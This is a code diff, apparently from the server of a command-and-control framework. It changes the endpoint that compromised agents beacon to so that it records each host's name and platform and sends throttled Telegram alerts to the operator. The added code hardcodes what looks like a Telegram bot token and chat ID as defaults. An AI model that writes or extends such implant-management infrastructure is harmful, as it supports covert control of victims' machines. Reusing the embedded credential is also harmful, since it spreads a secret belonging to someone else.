@@ -2993,7 +2993,7 @@ def agent_register():
 
 @app.route("/api/agent/beacon", methods=["POST"])
 def agent_beacon():
-    """Agent beacon with detailed tracking."""
+    """Agent beacon with detailed tracking and Telegram notifications."""
     enc_key = get_config("encryption_key")
     encrypted = request.headers.get("X-Enc") == "1" and enc_key
 
@@ -3022,8 +3022,11 @@ def agent_beacon():
         db.close()
         return jsonify({"error": "unknown agent"}), 404
     
-    # Update last seen
-    db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1, ip_external=? WHERE id=?", (request.remote_addr, agent_id))
+    # Update last seen and agent info
+    hostname = data.get("hostname", agent_row["hostname"])
+    platform_type = data.get("platform_type", agent_row["platform_type"])
+    db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1, ip_external=?, hostname=?, platform_type=? WHERE id=?", 
+               (request.remote_addr, hostname, platform_type, agent_id))
     
     # Get sleep/jitter config
     config_row = db.execute("SELECT sleep_interval, jitter FROM agents WHERE id=?", (agent_id,)).fetchone()
@@ -3041,9 +3044,21 @@ def agent_beacon():
     db.commit()
     db.close()
     
-    # Log beacon (throttled - every 10th beacon per agent to reduce noise)
+    # Send Telegram notification (throttled)
     if hash(agent_id + str(int(time.time()/60))) % 10 == 0:
-        log_event("beacon", f"{agent_id[:8]} ({agent_row['hostname']}) from {request.remote_addr} - {len(task_list)} tasks")
+        log_event("beacon", f"{agent_id[:8]} ({hostname}) from {request.remote_addr} - {len(task_list)} tasks")
+        
+        # Telegram notification
+        try:
+            import requests
+            bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
+            chat_id = os.environ.get("TELEGRAM_CHAT_ID", "5804150664")
+            
+            msg = f"📡 Beacon: {agent_id[:8]}\nHost: {hostname}\nTasks: {len(task_list)}"
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
+                         json={"chat_id": chat_id, "text": msg}, timeout=5)
+        except:
+            pass
     
     resp = json.dumps({"tasks": task_list, "sleep": sleep_interval, "jitter": jitter})
     if encrypted:
